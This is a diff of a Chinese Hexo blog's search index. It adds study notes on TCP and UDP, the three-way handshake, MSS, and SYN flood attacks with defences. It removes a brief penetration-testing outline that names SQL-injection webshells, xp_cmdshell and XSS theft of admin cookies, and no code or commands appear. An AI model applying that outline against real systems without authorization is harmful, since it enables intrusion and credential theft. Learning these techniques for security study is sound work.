+<li>目的端口</li>
+</ul>
+</blockquote>
+<p>TCP的出现是因为：</p>
+<blockquote>
+<p>IP 层是「不可靠」的，它不保证网络包的交付、不保证网络包的按序交付、也不保证网络包中的数据的完整性。</p>
+<p>而 TCP 是一个工作在<strong>传输层</strong>的<strong>可靠</strong>数据传输的服务，它能确保接收端接收的网络包是<strong>无损坏、无间隔、非冗余和按序的。</strong></p>
+</blockquote>
+<p>有一个 IP 的服务器监听了一个端口，它的 TCP 的最大连接数&#x3D;客户端的IP数*客户端的端口数</p>
+<blockquote>
+<p>对 IPv4，客户端的 IP 数最多为 <code>2</code> 的 <code>32</code> 次方，客户端的端口数最多为 <code>2</code> 的 <code>16</code>次方</p>
+</blockquote>
+<p>当然由于<strong>文件描述符限制</strong>和<strong>内存限制</strong>，最大连接数不会达到理想状态</p>
+<p>UDP与TCP区别</p>
+<blockquote>
+<p><em>1. 连接</em></p>
+<ul>
+<li><strong>TCP 是面向连接</strong>的传输层协议，传输数据前先要建立连接。</li>
+<li>UDP 是不需要连接，即刻传输数据。</li>
+</ul>
+<p><em>2. 服务对象</em></p>
+<ul>
+<li><strong>TCP 是一对一</strong>的两点服务，即一条连接只有两个端点。</li>
+<li>UDP 支持一对一、一对多、多对多的交互通信</li>
+</ul>
+<p><em>3. 可靠性</em></p>
+<ul>
+<li>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按需到达。</li>
+<li><strong>UDP 是尽最大努力交付</strong>，不保证可靠交付数据。</li>
+</ul>
+<p><em>4. 拥塞控制、流量控制</em></p>
+<ul>
+<li><strong>TCP 有拥塞控制和流量控制机制</strong>，保证数据传输的安全性。</li>
+<li>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率。</li>
+</ul>
+<p><em>5. 首部开销</em></p>
+<ul>
+<li><strong>TCP 首部长度较长，会有一定的开销</strong>，首部在没有使用「选项」字段时是 <code>20</code> 个字节，如果使用了「选项」字段则会变长的。</li>
+<li><strong>UDP 首部只有 8 个字节</strong>，并且是固定不变的，开销较小。</li>
+</ul>
+</blockquote>
+<p>由于 TCP 是面向连接，能保证数据的<strong>可靠性交付</strong>，因此经常用于：</p>
+<ul>
+<li><code>FTP</code> 文件传输</li>
+<li><code>HTTP</code> &#x2F; <code>HTTPS</code></li>
+</ul>
+<p>由于 UDP 面向无连接，它可以<strong>随时发送数据</strong>，再加上UDP本身的处理既简单又高效，因此经常用于：</p>
+<ul>
+<li>包总量较少的通信，如 <code>DNS</code> 、<code>SNMP</code> 等</li>
+<li>视频、音频等多媒体通信</li>
+<li>广播通信</li>
+</ul>
+<p>TCP为什么是三次握手</p>
+<blockquote>
+<ul>
+<li>三次握手才可以阻止历史重复连接的初始化（主要原因）</li>
+<li>三次握手才可以同步双方的初始序列号</li>
+<li>三次握手才可以避免资源浪费</li>
+</ul>
+</blockquote>
+<p>客户端连续发送多次 SYN 建立连接的报文，在网络拥堵等情况下：</p>
+<ul>
+<li>一个「旧 SVN 报文」比「最新的 SYN 」 报文早到达了服务端；</li>
+<li>那么此时服务端就会回一个 <code>SYN + ACK</code> 报文给客户端；</li>
+<li>客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送 <code>RST</code> 报文给服务端，表示中止这一次连接。</li>
+</ul>
+<p>如果是两次握手连接，就不能判断当前连接是否是历史连接，三次握手则可以在客户端（发送方）准备发送第三次报文时，客户端因有足够的上下文来判断当前连接是否是历史连接：</p>
+<ul>
+<li>如果是历史连接（序列号过期或超时），则第三次握手发送的报文是 <code>RST</code> 报文，以此中止历史连接；</li>
+<li>如果不是历史连接，则第三次发送的报文是 <code>ACK</code> 报文，通信双方就会成功建立连接；</li>
+</ul>
+<p>总之</p>
+<blockquote>
+<ul>
+<li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</li>
+<li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li>
+</ul>
+</blockquote>
+<p>IP 层会分片，为什么 TCP 层还需要 MSS ？</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619131302011.png"></p>
+<p>IP层本身没有超时重传机制，TCP才有。如果整个(TCP头部+TCP数据)交给IP层分片，当其中一个IP片丢失，整个IP报文都得重传。</p>
+<p>为了达到最佳的传输效能 ，TCP 协议就通过MSS切片、重传，效率很高。</p>
+<p>SYN 攻击</p>
+<blockquote>
+<p>TCP 连接建立是需要三次握手，假设攻击者短时间伪造不同 IP 地址的 <code>SYN</code> 报文，服务端每接收到一个 <code>SYN</code> 报文，就进入<code>SYN_RCVD</code> 状态，但服务端发送出去的 <code>ACK + SYN</code> 报文，无法得到未知 IP 主机的 <code>ACK</code> 应答，久而久之就会<strong>占满服务端的 SYN 接收队列（未连接队列）</strong>，使得服务器不能为正常用户服务。</p>
+</blockquote>
+<p>避免方法</p>
+<blockquote>
+<p>1.控制SYN_RCVD 状态连接的最大个数，超出时丢弃。</p>
+<p>2.SYN队列占满，则启动cookie，net.ipv4.tcp_syncookies &#x3D; 1</p>
+</blockquote>
+<p><a href="https://mp.weixin.qq.com/s/lFnyBaaP3f0eNcKGW5RtCg">图解TCP</a></p>
+]]></content>
       <categories>
         <category>网安</category>
       </categories>
       <tags>
         <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透测试</title>
-    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
-<h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>要获取到什么权限</p>
-<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>基础设施枚举（获取公司在互联网和内部网上的位置；确定公司的安全措施）</p>
-<p>服务枚举（服务版本、服务信息；许多服务有版本历史记录，可以识别主机或服务器上安装的版本是否是真的或新的）</p>
-<p>主机枚举（确定该主机或服务器扮演什么角色以及它与哪些网络组件通信。此外，确定所用服务及用途，以及端口。）</p>
-<p>掠夺（获取敏感信息如员工姓名、客户数据【需要在目标主机上获取到访问权限】）</p>
-<p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
-<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
-<p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
-<p>备案信息</p>
-<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
-<p>框架组件公开漏洞</p>
-<p>口令漏洞</p>
-<p>代码审计0day</p>
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
-<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第一篇博客</title>
-    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
-</blockquote>
-<p>主题优化参照如下：</p>
-<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
-]]></content>
-      <categories>
-        <category>博客搭建及其优化</category>
-      </categories>
-      <tags>
-        <tag>博客经验来源</tag>
       </tags>
   </entry>
   <entry>
